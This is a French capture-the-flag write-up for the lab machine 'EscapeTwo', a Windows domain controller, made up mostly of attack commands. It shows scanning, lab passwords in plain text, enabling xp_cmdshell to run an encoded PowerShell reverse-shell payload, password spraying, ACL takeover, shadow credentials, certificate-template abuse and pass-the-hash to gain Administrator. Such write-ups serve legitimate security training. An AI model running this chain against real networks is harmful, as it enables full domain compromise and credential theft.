  # EscapeTwo

VM Windows avec un premier compte fourni 

	echo "10.10.11.51 DC01.sequel.htb sequel.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.51 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.51 -oN nmap.txt
	
Scans classiques.

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 08:39:14Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-13T08:41:13+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-13T08:41:13+00:00; -1s from scanner time.
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49664/tcp open  unknown
    49665/tcp open  unknown
    49666/tcp open  unknown
    49667/tcp open  unknown
    49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49686/tcp open  unknown
    49687/tcp open  unknown
    49702/tcp open  unknown
    49718/tcp open  unknown
    49739/tcp open  unknown
    49810/tcp open  unknown


Fichier Excel avec des mots de passe : 

    netexec smb DC01.sequel.htb -u rose -p 'KxEPkKe6R8su' --shares
    impacket-smbclient 'sequel.htb/rose:KxEPkKe6R8su'@10.10.11.51
    # use Accounting Department
    # get accounting_2024.xlsx
    # get accounts.xlsx
    # exit
    unzip accounts.xlsx
    cat xl/sharedStrings.xml
    

Utilisation du compte SQL : 

    impacket-mssqlclient 'sequel.htb/sa'@10.10.11.51
    SQL (sa  dbo@master)> enable_xp_cmdshell
    SQL (sa  dbo@master)> xp_cmdshell whoami
    SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGw...pAA==
    
    ncat.exe -lnvp 8888


Mot de passe dans un fichier de configuration : 

    cd C:\SQL2019\ExpressAdv_ENU
    type sql-Configuration.INI
    

Password spraying : 

    netexec smb DC01.sequel.htb -u rose -p 'KxEPkKe6R8su' --rid-brute
    netexec smb DC01.sequel.htb -u users.txt -p $PASSWORD 
    evil-winrm -u ryan -p $PASSWORD -i 10.10.11.51


Bloodhound : 

    bloodhound-python -d sequel.htb -v --zip -c ALL -u ryan -p 'WqSZAF6CysDQbGb3' -dc dc01.sequel.htb -ns 10.10.11.51
    

Exploitation des droits d'écriture de Ryan sur CA_SVC pour les passer en contrôle total : 

    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p "$PASSWORD" set owner ca_svc ryan
     
    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':"$PASSWORD"

    
Shadow Credentials + ESC : 

    certipy-ad shadow auto -u ryan@sequel.htb -p "$PASSWORD" -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc
    
    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
    
    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
    
    certipy-ad req -u ca_svc -hashes "$HASH" -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51
        
    certipy-ad auth -pfx ./administrator_10.pfx -dc-ip 10.10.11.51



Connexion finale :

    evil-winrm -i dc01.sequel.htb -u administrator -H "$HASH"
    type C:\Users\*\Desktop\user.txt
    type C:\Users\Administrator\Desktop\root.txt
